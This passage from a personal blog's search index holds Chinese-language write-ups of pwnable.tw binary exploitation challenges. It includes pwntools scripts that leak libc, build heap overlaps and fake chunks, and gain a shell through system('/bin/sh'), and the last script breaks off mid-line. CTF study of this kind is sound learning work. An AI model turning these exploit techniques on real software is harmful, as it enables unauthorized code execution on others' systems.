class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc_base = libc_start_main_addr - libc.symbols(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libc_base + libc.symbols(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.search(<span class=\"string\">&quot;/bin/sh;&quot;</span>).__next__()</span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_addr_base &quot;</span>+<span class=\"built_in\">hex</span>(libc_addr_base))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;bin_sh_addr &quot;</span>+<span class=\"built_in\">hex</span>(bin_sh_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\x00&quot;</span>*<span class=\"number\">0x110</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(rdi_ret)</span><br><span class=\"line\">payload += p64(bin_sh_addr)</span><br><span class=\"line\">payload += p64(system_addr)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">begin(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">35</span>):</span><br><span class=\"line\">\tadd()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1><span id=\"一些思考\">一些思考</span></h1><p>​        其实感觉很多题就差临门一脚，如果是在比赛的话多调半个小时可能就出了。我的定力还是太差了。</p>\n","categories":["Binary_security"],"tags":["STACK - Canary"]},{"title":"pawnable - secret_of_my_heart","url":"/2022/05/15/week11_7.2_pawnable_secret_of_my_heart/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-DlYHMGfS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        蛮好，好久没有做到全绿的题了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%882.04.22.png\" alt=\"截屏2022-05-15 下午2.04.22\"></p>\n<p>​        程序还是菜单，增删查三个功能，并不是特别友好。</p>\n<h1><span id=\"reverse\">reverse</span></h1><h2><span id=\"mem_init\">mem_init</span></h2><p>​        初始化了一个随机地址的0x1000的空间，并把它的指针存放在bss段上。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( v2 &lt;= <span class=\"number\">0x10000</span> )</span><br><span class=\"line\">    v2 = rand() &amp; <span class=\"number\">0xFFFFF000</span>;</span><br><span class=\"line\">  unk_202018 = mmap((<span class=\"keyword\">void</span> *)v2, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">3</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  result = unk_202018;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"add\">add</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">allocate(head + <span class=\"number\">48LL</span> * i, size);</span><br></pre></td></tr></table></figure>\n<p>跟进allocate函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*a1 = a2;                                     <span class=\"comment\">// first filed =&gt; size</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name of heart :&quot;</span>);</span><br><span class=\"line\">read_str(a1 + <span class=\"number\">1</span>, <span class=\"number\">32LL</span>);                       <span class=\"comment\">// second filed =&gt; name</span></span><br><span class=\"line\">a1[<span class=\"number\">5</span>] = <span class=\"built_in\">malloc</span>(a2);</span><br></pre></td></tr></table></figure>\n<p>这里的<code>read_str</code>:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(buf + str_len - <span class=\"number\">1</span>) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    *(buf + str_len - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>​        判断结尾的时候-1，比如说如果我输入了20个字符，第19个是换行，那么19就会被置0，但是20还是不会变化，然后返回20这个数。</p>\n<p>​        接着是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;secret of my heart :&quot;</span>);</span><br><span class=\"line\">  result = (a1[<span class=\"number\">5</span>] + read_str(a1[<span class=\"number\">5</span>], a2));       <span class=\"comment\">// input in the head + 40 ,then put the last byte to 0</span></span><br><span class=\"line\">  *result = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>​        这样这个*result的最后就有两个空字节了。</p>\n<h2><span id=\"show\">show</span></h2><p>​        就是打印对应的字符串。目前咩有什么好分析的，</p>\n<h2><span id=\"free\">free</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*buf = <span class=\"number\">0LL</span>;<span class=\"comment\">//free heap</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>((buf + <span class=\"number\">8</span>), <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\"><span class=\"built_in\">free</span>(*(buf + <span class=\"number\">40</span>));<span class=\"comment\">//free secret</span></span><br><span class=\"line\">result = buf;</span><br><span class=\"line\">*(buf + <span class=\"number\">40</span>) = <span class=\"number\">0LL</span>;<span class=\"comment\">//set 0 to secret</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> result</span><br></pre></td></tr></table></figure>\n<p>​        非常认真地置0了很多东西。应该没有uaf了。</p>\n<h2><span id=\"secret\">secret</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your secret : %p\\n&quot;</span>, head);</span><br><span class=\"line\"> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Good bye ~&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<p>一个bss的leak。看似赚了，实则赔钱。估计是可以打exit hook。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        还是没有什么很成型的思路，先动调一下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"第一个疑点没用\">第一个疑点（没用</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%888.34.11.png\" alt=\"截屏2022-05-15 下午8.34.11\"></p>\n<p>​        </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(0x18,b&#x27;a&#x27;*0x20,b&#x27;a&#x27;*0x18)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%888.34.48.png\" alt=\"截屏2022-05-15 下午8.34.48\"></p>\n<p>​        </p>\n<p>​        这里name大于或者等于size，就会清空secret。然后将name的东西覆盖到secret的空间。比如说</p>\n<p>​        稍微理一下，这里head是一个随机地址的指针，然后name储存在head上，secret ptr储存在<code>head[5]</code>上，是一个堆上的数据。</p>\n<p>​        然后如果申请secret，大概是这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%888.41.08.png\" alt=\"截屏2022-05-15 下午8.41.08\"></p>\n<p>​            有一个非常突兀的27，ascii是‘，我也不知道是干啥的，也不知道为什么会出现。</p>\n<h2><span id=\"leak-heap\">leak heap</span></h2><p>​        还是继续了解程序，这里虽然程序给了我们secret的leak，但是一旦执行就会退出，所以可以利用gdb的查找来找道当前进程下这个随机的地址。比如我给我的name输入rin777，然后：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%889.00.21.png\" alt=\"截屏2022-05-15 下午9.00.21\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%889.00.32.png\" alt=\"截屏2022-05-15 下午9.00.32\"></p>\n<p>​        当然这样的坏处是每次重新开进程都需要搞一次，但是问题不大。</p>\n<p>​        观察一下这个name，这里把7ffff7fff010这个地址拆开来了，但是似乎也不能溢出。然后如果free了相应的heart，name就只剩size域没有被清空。</p>\n<p>​        我超，我刚刚随意show了一下，发现一个heap leak。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%889.15.52.png\" alt=\"截屏2022-05-15 下午9.15.52\"></p>\n<p>​        好东西。但是不是重点。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;qwq&#x27;</span>+<span class=\"string\">b&#x27;a&#x27;</span> *<span class=\"number\">26</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x50</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">33</span>:<span class=\"number\">39</span>]</span><br><span class=\"line\">heap_base = u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_base:&quot;</span> + <span class=\"built_in\">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>\n<p>​        哎，稳定leak heap，如果这个题没有限制size就可以用mmap leak libc了。</p>\n<h2><span id=\"off-by-one和一些废话\">off by one（和一些废话）</span></h2><p>​    继续研究。第一个疑点的稳定利用方式还是没有找到，我感觉这里是有单字节溢出，但是怎么都找不到利用方式。</p>\n<p>​        我是个如假包换的傻逼，我终于知道这个问题在哪里了。我在add函数写发送name和secret的时候全部在前面加了一个str（），导致gdb显示的东西乱七八糟混淆视听了。</p>\n<p>​        这样看之前那个疑点其实并不是疑点，只是一个程序的feature。</p>\n<p>​        真正的off by one其实是在secret。这里确实是我傻逼了，我直接傻愣愣地连续申请三个chunk，怎么可能看得出来off by one？直接free中间的一个chunk，然后再申请回来自然就有了，还是同类题做得太太太少了。大概像这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;qwq&#x27;</span> + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">29</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;qaq&#x27;</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br></pre></td></tr></table></figure>\n<p>​            这样就可以溢出到下一个chunk：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.16.46.png\" alt=\"截屏2022-05-15 下午11.16.46\"></p>\n<p>​        然后就是需要利用到off by one来构造uaf。</p>\n<p>​        这里如果构造off by one的chunk是unsorted bin chunk的话，uaf就可以leak libc，还能任意地址写，一举两得。</p>\n<p>​        所以如何构造呢？</p>\n<h2><span id=\"off-by-one构造double-free\">off by one构造double free</span></h2><p>​        蛮久没有做off by one的题了，先大致回想一下。        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;qwq&#x27;</span> + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">29</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#add(0x68,b&#x27;qaq&#x27;,b&#x27;c&#x27;*0x18)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>\n<p>​        这里，这个用来被溢出的chunk的size，因为只能溢出一个空字节，所以低位会被置为00，所以这里size肯定得是三位数，所以这样一看比较方便的就是0xf8，正好对应它的free 时的size位0x100.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.26.48.png\" alt=\"截屏2022-05-15 下午11.26.48\" style=\"zoom:50%;\"></p>\n<p>​        </p>\n<p>​        所以这里我们就伪造了一个free chunk，如果再将其free掉就能收获一个快乐的libc leak。然而事实没有那么如意，这里存在一定的检测，如果是像我测试时那样呆呆地将上一个chunk的fd和bl全部置为a的话，这里铁定会报错。        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">payload = p64(heap_base) * <span class=\"number\">2</span> + p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,payload)<span class=\"comment\">#chunk3</span></span><br><span class=\"line\">free2(<span class=\"number\">1</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Secret :&quot;</span>)</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">1</span>:<span class=\"number\">7</span>]</span><br><span class=\"line\">libc_base = u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x10</span> - <span class=\"number\">88</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base:&quot;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">one_gadget = libc_base + one_gadget_offset[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<p>​        这样也就确实可以leak libc了。        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.59.35.png\" alt=\"截屏2022-05-15 下午11.59.35\"></p>\n<p>​        </p>\n<p>​        这里其实是利用到一个chunk overlapping的向前合并的原理。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-16%20%E4%B8%8A%E5%8D%8812.07.27.png\" alt=\"截屏2022-05-16 上午12.07.27\"></p>\n<p>​        20是0x100chunk的prev size位，当free 0x100chunk，就会触发unlink向前合并。</p>\n<p>​        但是问题也就随之而来，我们没有办法继续利用了。</p>\n<p>​        这个时候如果申请的是小于unsorted bin的chunk，那么就会从unsorted bin中分割，如果大于，就直接把整个unsorted bin 放进small bin，然后再分配。总之就是，没有任何办法再构造double free了，所以这个思路虽然能leak libc，但是不能进行任意地址写，也是白搭。</p>\n<p>​        那么怎么样才能既leak又能任意地址写呢？</p>\n<h2><span id=\"chunk-overlapping任意地址写\">chunk overlapping任意地址写</span></h2><p>​        乖乖地去看wp了。</p>\n<p>​        其实还是比较套路，但是是属于我不会的程度了。其实就是在第一次向前合并的时候，再申请一个chunk2。这样在unlink的时候，chunk2就会被置为freechunk，具体原因我明天专门写一个深入理解chunk overlap。。就像这样：        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-16%20%E4%B8%8A%E5%8D%8812.28.33.png\" alt=\"截屏2022-05-16 上午12.28.33\"></p>\n<p>​        所以我们可以对这个chunk2进行二次free。构造一个double free。然后就可以按照套路将其fd改为对应地址，进行一个fastbin dup。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - ChunkOverlapping"]},{"title":"pawnable - spirited_away","url":"/2022/05/17/week12_2_pawnable_spirited_away/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-FtBxNWRD\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​    栈题。</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>有一点诡异。</p>\n<p>整体的逻辑非常清晰简单，但是有疑惑的地方。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( choice == <span class=\"string\">&#x27;Y&#x27;</span> || choice == <span class=\"string\">&#x27;y&#x27;</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(name);                               <span class=\"comment\">// UAF??</span></span><br><span class=\"line\">  <span class=\"keyword\">goto</span> LABEL_2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里将name free，但是我在bin中并咩有找到。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        reason处有一个leak。因为reason的地址本身就有内容，可以leak一个地址。或者说整个reason范围内的地址我们都可以任意leak。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-17%20%E4%B8%8A%E5%8D%8811.15.17.png\" alt=\"截屏2022-05-17 上午11.15.17\"></p>\n<p>​        虽然reason的输入会导致地址的低位被覆盖，但是从原本的地址可以看出这实际上是个libc，所以四舍五入我们leak 了libc，这里直接给出了<code>__GI__IO_file_xsputn</code>，但是我觉得应该不是io file的题。。。吧？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-17%20%E4%B8%8A%E5%8D%8811.24.59.png\" alt=\"截屏2022-05-17 上午11.24.59\">        </p>\n<p>​        这里的heap感觉没有利用空间，free了name过后bin直接与top chunk合并了，就没有办法在bin中利用，这应该是纯粹防止我们太快乐栈溢出的。所以关注点还是应该放在栈上。</p>\n<p>​        值得一提的是，重新输入数据会覆盖原有的，heap段也类似，只不过是free了原来的指针。，因此输入的栈地址并不会改变。    </p>\n<p>​        所以现在的困难在于如何溢出。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-17%20%E4%B8%8B%E5%8D%882.55.19.png\" alt=\"截屏2022-05-17 下午2.55.19\"></p>\n<p>​        可以看到<code>0xffffdde8</code>之后就是返回地址，但是程序对于数据的输入有着严格的限制，我们正常情况下很难溢出。</p>\n<p>​        但是栈上控制执行流，或者说构造栈溢出的办法本身就很少。age作为一个int测试过无法溢出。</p>\n<p>​        不会真的是io file吧。虽然之前也做过类似的题，但是也太突然了。</p>\n<p>​        。。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-17%20%E4%B8%8B%E5%8D%883.28.03.png\" alt=\"截屏2022-05-17 下午3.28.03\"></p>\n<p>​        </p>\n<p>​        没有思路，去看了wp，确实学到了新的利用思路。        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-17%20%E4%B8%8B%E5%8D%883.56.21.png\" alt=\"截屏2022-05-17 下午3.56.21\"></p>\n<p>​        这里之前被我自己迷惑了，没有认真看，以为这个数组就是个idx，但是实际上一个字符串数组，所以当sprintf时，如果cnt增长到三位数，这个字符串的最后一个字节就会向后覆盖，而后面正好就是nbyte，所以能将它覆盖为固定的0x6e，虽然不是特别大，但是足够溢出comment和name了。</p>\n<p>​        接下来本该是非常自然的想法：由于nbytes。也就是之前的60字节呗覆盖为了0x6e字节，所以我们的name和comment都能够溢出。</p>\n<p>​        查看一下这两个溢出能导致怎样的结果：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8A%E5%8D%8811.00.28.png\" alt=\"截屏2022-05-18 上午11.00.28\"></p>\n<p>​        可以看到reason的输入是在<code>0xffffdd98</code>，而comment是<code>0xffffdd40</code>，name则是在heap段，所以我们并不能直接溢出comment或者name来覆盖retn。</p>\n<p>​        现在我们只能溢出name和comment，这两个地址，name目前来说没有意义，而comment，注意到<code>0xffffdd94</code>实际上是name所在的heap的地址，所以我们是不是能溢出这个地址来修改name输入的地方呢？</p>\n<p>​        计算一下偏移。溢出大概需要输入 84+ 4。</p>\n<p>​        溢出heap指针为stack地址，也就是reason所在的地址，这样在reason伪造一个fake chunk，free name时就会将我们在reason伪造的chunk free，此后分配的name就是在栈上。由于name的输入字符可以构成溢出，因此可以控制程序执行流，从而getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./spirited_away&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;chall.pwnable.tw&quot;,10302)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./spirited_away&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = [<span class=\"number\">0x3a819</span>,<span class=\"number\">0x5f065</span>,<span class=\"number\">0x5f066</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">name,reason,comment</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;age: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;movie? &quot;</span>)</span><br><span class=\"line\">\tp.send(reason)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;comment: &quot;</span>)</span><br><span class=\"line\">\tp.send(comment)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwirte nbytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\trun(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>)\t</span><br><span class=\"line\">\tp.send(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">run(<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;\\x10&#x27;</span>,<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">30</span>)\t</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Reason:&quot;</span>)</span><br><span class=\"line\">xsputn = u32(p.recv()[<span class=\"number\">1</span>:<span class=\"number\">5</span>])</span><br><span class=\"line\">libc_base = xsputn - libc.symbols[<span class=\"string\">&quot;__GI__IO_file_xsputn&quot;</span>]</span><br><span class=\"line\">one_gadget = libc_base + one_gadget[<span class=\"number\">0</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.search(<span class=\"string\">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak stack</span></span><br><span class=\"line\"></span><br><span class=\"line\">run(<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">56</span>,<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">30</span>)\t</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Reason:&quot;</span>)</span><br><span class=\"line\">stack_addr = u32(p.recv()[<span class=\"number\">57</span>:<span class=\"number\">61</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;stack_addr:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(stack_addr)))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#forge fake chunk </span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x41</span>)<span class=\"comment\">#fake chunk</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">run(<span class=\"string\">b&#x27;a&#x27;</span>,payload,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">40</span> + p32(stack_addr + <span class=\"number\">8</span>))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x4c</span> + p32(system_addr) + p32(<span class=\"number\">0x12345678</span>) + p32(bin_sh_addr)</span><br><span class=\"line\">run(payload,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span 